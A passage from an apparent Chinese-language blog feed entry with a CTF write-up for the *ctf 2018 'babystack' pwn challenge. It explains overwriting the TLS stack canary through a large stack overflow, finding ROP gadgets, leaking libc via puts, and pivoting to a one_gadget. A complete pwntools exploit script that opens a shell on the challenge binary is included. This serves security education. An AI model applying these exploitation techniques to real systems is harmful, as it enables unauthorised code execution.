addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"cookie main: 0x%lx\n"</span>, addr[<span class="number">5</span>]);</span><br><span class="line">    pthread_create(&amp;one, <span class="literal">NULL</span>, &amp;first, <span class="number">0</span>);</span><br><span class="line">    pthread_join(one,&amp;val);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>运行结果。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">blackzert@...sher:~/aslur/tests$ ./thread_stack_tls  1</span><br><span class="line">main FS 0x7f4d94b75700</span><br><span class="line">cookie main: 0x2ad951d602d94100</span><br><span class="line">thread FS 0x7f4d94385700</span><br><span class="line">cookie thread: 0x2ad951d602d94100</span><br><span class="line">stack_cookie addr 0x7f4d94384f48</span><br><span class="line">diff : 7b8</span><br></pre></td></tr></table></figure></p><p>在当前栈帧和TCB结构之间的距离等于0x7b8,小于一页,只要溢出的字节够多，就可以把TCB中的tcbhead_t.stack_guard覆盖掉。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>先输入要输入的字节的数目，然后程序从终端读取输入内容，因为可输入的size最大0x10000，远大于栈的大小，栈溢出。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-24-164114.jpg" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-24-164219.png" alt=""></p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><p><img src="http://onc55v8te.bkt.clouddn.com/2018-04-24-164348.jpg" alt=""></p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>通过栈溢出构造rop，leak出libc的基地址，找到one_gadaget的偏移。<br>然后将这个地址读到bss段，然后leave&amp;&amp;ret，劫持rip到one_gadaget。</p><h3 id="确定padding"><a href="#确定padding" class="headerlink" title="确定padding"></a>确定padding</h3><p>s在rbp-0x1010，再加上old rbp即8个字节，到返回地址前一共是0x1018个字节。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-24-171603.png" alt=""></p><h3 id="leak-libc"><a href="#leak-libc" class="headerlink" title="leak libc"></a>leak libc</h3><p>当我们调用puts.plt的时候，系统会将真正的puts函数地址link到got表的puts.got中，然后puts.plt会根据puts.got跳转到真正的puts函数上去。<br>然后我们需要一个gadget(pop rdi;ret)来传递参数。</p><p>使用工具ROPgadget寻找<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">parallels@ubuntu:~/ctf/6ctf/babystack$ ROPgadget --binary bs --only &quot;pop|ret&quot;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">0x0000000000400c03 : pop rdi ; ret</span><br><span class="line">0x0000000000400c01 : pop rsi ; pop r15 ; ret</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">Unique gadgets found: 12</span><br></pre></td></tr></table></figure></p><p>然后减去puts在libc里的偏移就是libc的基地址。</p><h3 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h3><p>直接用IDA搜索字符串/bin/sh，然后找到下面这种就是one_gadget，可以直接起shell。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-24-173344.png" alt=""><br>也可以使用工具<a href="https://github.com/david942j/one_gadget" target="_blank" rel="noopener">one_gadget</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install ruby</span><br><span class="line">sudo gem install one_gadget</span><br></pre></td></tr></table></figure></p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-04-24-173642.png" alt=""></p><h3 id="调用read把one-gadget的地址读到bss段"><a href="#调用read把one-gadget的地址读到bss段" class="headerlink" title="调用read把one_gadget的地址读到bss段"></a>调用read把one_gadget的地址读到bss段</h3><p>之前我们已经找到了gadget用来传递read的参数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000400c03 : pop rdi ; ret</span><br><span class="line">0x0000000000400c01 : pop rsi ; pop r15 ; ret</span><br></pre></td></tr></table></figure></p><p>调用read把one_gadget写到bss_addr。</p><p>通过leave先将rsp的值改为bss_addr，因为之前我们已经将one_gadget写到了bss_addr，然后通过ret，就可以劫持程序执行到one_gadget。</p><ul><li><p>leave：<br>在32位汇编下相当于:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov esp,ebp                                        </span><br><span class="line">pop ebp</span><br></pre></td></tr></table></figure></li><li><p>ret<br>相当于</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop rip</span><br></pre></td></tr></table></figure></li></ul><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"./libc.so"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(bytes,data)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"How many bytes do you want to send?\n"</span>)</span><br><span class="line">    io.sendline(str(bytes))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.send(data)</span><br><span class="line"></span><br><span class="line">puts_plt = <span class="number">0x4007C0</span></span><br><span class="line">read_plt = <span class="number">0x4007E0</span> </span><br><span class="line">leave_addr = <span class="number">0x400A9B</span></span><br><span class="line"></span><br><span class="line">pop_rdi_addr = <span class="number">0x400c03</span></span><br><span class="line">puts_got = <span class="number">0x601FB0</span></span><br><span class="line">pop_rbp_addr = <span class="number">0x400870</span></span><br><span class="line">pop_rsi_addr = <span class="number">0x400c01</span></span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x602030</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">'./bs'</span>,env = &#123;<span class="string">"LD_PRELOAD"</span> : <span class="string">"./libc.so"</span>&#125;)</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0x1010</span>+p64(bss_addr<span class="number">-0x8</span>)+p64(pop_rdi_addr) + p64(puts_got) + p64(puts_plt)</span><br><span class="line">payload += p64(pop_rdi_addr) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_addr) + p64(bss_addr) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(read_plt) + p64(leave_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x2000</span>,<span class="string">'\x00'</span>)</span><br><span class="line">menu(<span class="number">0x2000</span>,payload)</span><br><span class="line">io.recvuntil(<span class="string">'It\'s time to say goodbye.\n'</span>)</span><br><span class="line">base = u64(io.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">io.send(p64(base+<span class="number">0xf1147</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-04-24-180654.png" alt=""></p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>要拿到flag，还要在服务器上绕过之前0ctf一样的waf，这个没什么好说的，爆破就行，这里只贴出本地getshell的代码。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;赛题链接&quot;&gt;&lt;a href=&quot;#赛题链接&quot; class=&quot;headerlink&quot; title=&quot;赛题链接&quot;&gt;&lt;/a&gt;赛题链接&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/sixstars/starctf2018/tree/master/p
      
    
    </summary>
    
      <category term="CTF" scheme="http://eternalsakura13.com/categories/CTF/"/>
    
      <category term="pwn" scheme="http://eternalsakura13.com/categories/CTF/pwn/"/>
    
      <category term="栈溢出" scheme="http://eternalsakura13.com/categories/CTF/pwn/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
    
      <category term="canary" scheme="http://eternalsakura13.com/tags/canary/"/>
    
  </entry>
  
</feed>
